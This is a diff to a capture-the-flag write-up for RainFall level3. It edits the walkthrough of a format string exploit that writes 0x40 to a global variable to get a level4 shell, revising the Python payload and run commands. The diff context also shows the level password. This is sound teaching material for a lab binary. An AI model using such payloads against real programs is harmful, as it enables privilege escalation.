@@ -17,14 +17,6 @@ level3@RainFall:~$ ls
 level3
 ```
 
-Check the binary protections:
-
-```bash
-level3@RainFall:~$ checksec level3
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
-```
-
 > Important notes:
 >
 > * **No stack canary** → stack overflows possible.
@@ -43,14 +35,16 @@ Running the program with format specifiers:
 0x200 0xb7fd1ac0 0xb7ff37d0
 ```
 
-Trying with more data:
+> The input is passed directly into `printf`, confirming a **format string vulnerability**.
+
+This means the printf used is not protected. instead of printing the absolute value of the string it interprets it while reading the stack.
+
+Let's try to pinpoint at which point printf starts interacting with the stack:
 
 ```bash
 ./level3 "aaaa %p %p %p %p %p"
 aaaa 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x20702520
 ```
-
-> The input is passed directly into `printf`, confirming a **format string vulnerability**.
 
 ---
 
@@ -121,6 +115,8 @@ Output:
 
 So we need to set `m = 0x40`.
 
+> I am not going into too many details here, but v compares m to 0x40 == 64
+
 ---
 
 ## Step 5: Exploitation Strategy
@@ -132,13 +128,13 @@ Address of `m`: `0x0804988c`.
 Construct payload:
 
 ```bash
-python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' > /tmp/ex
+python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"' > /tmp/lv3
 ```
 
 Run it:
 
 ```bash
-./level3 < /tmp/ex
+./level3 < /tmp/lv3
 ```
 
 Output:
@@ -157,7 +153,7 @@ Wait what?!
 Run interactively:
 
 ```bash
-cat /tmp/ex - | ./level3
+cat /tmp/lv3 - | ./level3
 ```
 
 Now check identity:
@@ -184,8 +180,8 @@ b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 * **Payload Example:**
 
   ```bash
-  python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' > /tmp/ex
-  ./level3 < /tmp/ex
+  python -c 'print "\x8c\x98\x04\x08" + "%60d%4$n"' > /tmp/lv3
+  ./level3 < /tmp/lv3
   ```
 * **Outcome:** Escalation to `level4` and retrieval of its password.
 
